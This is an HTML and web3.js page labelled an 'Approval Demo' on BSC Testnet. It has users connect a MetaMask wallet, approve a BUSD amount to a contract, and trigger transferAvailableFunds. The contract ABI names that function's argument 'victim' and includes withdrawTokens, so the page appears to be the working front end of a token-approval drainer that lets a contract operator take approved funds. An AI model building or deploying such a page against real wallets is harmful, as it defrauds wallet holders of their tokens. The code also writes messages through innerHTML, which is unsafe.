<!DOCTYPE html>
<html>
<head>
    <title>Approval Demo</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
        button { padding: 10px; margin: 5px; cursor: pointer; background: #f0f0f0; border: 1px solid #ccc; }
        #walletInfo { display: none; margin-top: 20px; padding: 15px; border: 1px solid #eee; }
        #status { margin-top: 10px; padding: 10px; background: #f8f8f8; }
        input { padding: 8px; width: 100px; }
    </style>
</head>
<body>
    <h1>Approval Demo (BSC Testnet)</h1>
    <button id="connectWallet">Connect Wallet</button>
    
    <div id="walletInfo">
        <p>Connected: <strong id="walletAddress"></strong></p>
        <div>
            <input type="number" id="amountInput" placeholder="10" step="0.1"> BUSD
            <button id="requestApproval">Approve</button>
        </div>
        <button id="transferFunds">Transfer Funds</button>
        <div id="status"></div>
    </div>

    <script>
        // Contract details
        const BUSD_ADDRESS = "0x8301F2213c0eeD49a7E28Ae4c3e91722919B8B47";
        const CONTRACT_ADDRESS = "0xe13a0fc939a16315fb9de42200123989642f4946";
        
        // Contract ABI (MUST match your deployed contract)
        const CONTRACT_ABI = [
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "token",
                "outputs": [{"internalType": "contract IERC20", "name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
                "name": "requestApproval",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "address", "name": "victim", "type": "address"}],
                "name": "transferAvailableFunds",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        let web3;
        let accounts = [];
        let contract;

        // Connect wallet
        document.getElementById('connectWallet').onclick = async () => {
            if (window.ethereum) {
                try {
                    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    web3 = new Web3(window.ethereum);
                    
                    // Initialize contract
                    contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                    
                    document.getElementById('walletAddress').textContent = accounts[0];
                    document.getElementById('walletInfo').style.display = 'block';
                    updateStatus("Connected to BSC Testnet");
                } catch (error) {
                    updateStatus(`Error: ${error.message}`);
                }
            } else {
                updateStatus("Please install MetaMask!");
            }
        };

        // Approve BUSD
        document.getElementById('requestApproval').onclick = async () => {
            const amount = document.getElementById('amountInput').value;
            if (!amount || isNaN(amount)) {
                updateStatus("Please enter a valid amount");
                return;
            }
            
            try {
                const tx = await contract.methods.requestApproval(web3.utils.toWei(amount))
                    .send({ from: accounts[0] });
                updateStatus(`Approved ${amount} BUSD. TX: <a href="https://testnet.bscscan.com/tx/${tx.transactionHash}" target="_blank">View</a>`);
            } catch (error) {
                updateStatus(`Approval failed: ${error.message}`);
            }
        };

        // Transfer funds
        document.getElementById('transferFunds').onclick = async () => {
            try {
                const tx = await contract.methods.transferAvailableFunds(accounts[0])
                    .send({ from: accounts[0] });
                updateStatus(`Funds transferred. TX: <a href="https://testnet.bscscan.com/tx/${tx.transactionHash}" target="_blank">View</a>`);
            } catch (error) {
                updateStatus(`Transfer failed: ${error.message}`);
            }
        };

        function updateStatus(message) {
            document.getElementById('status').innerHTML = message;
        }
    </script>
</body>
</html>
